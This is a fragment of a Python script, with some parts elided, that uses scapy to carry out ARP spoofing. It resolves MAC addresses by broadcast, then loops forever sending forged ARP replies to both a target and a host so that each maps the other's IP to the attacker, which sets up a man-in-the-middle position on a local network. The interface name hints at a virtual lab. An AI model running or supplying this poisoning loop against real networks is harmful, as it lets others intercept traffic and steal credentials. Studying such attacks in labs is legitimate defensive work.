...
def get_mac(ip, iface="veth-srv"):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False, iface = iface)[0]
	if len(answered_list) == 0:
		return scapy.get_if_hwaddr(iface)
	return answered_list[0][1].hwsrc

def spoof(target_ip, host_ip, iface="veth-srv", verbose=True):
    """
    ...
    """
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip, iface),
															psrc = host_ip)
...
if __name__ == "__main__":
    ...
    try:
        ...
        while True:
            ...
            spoof(target, host, "veth-srv", verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, "veth-srv", verbose)
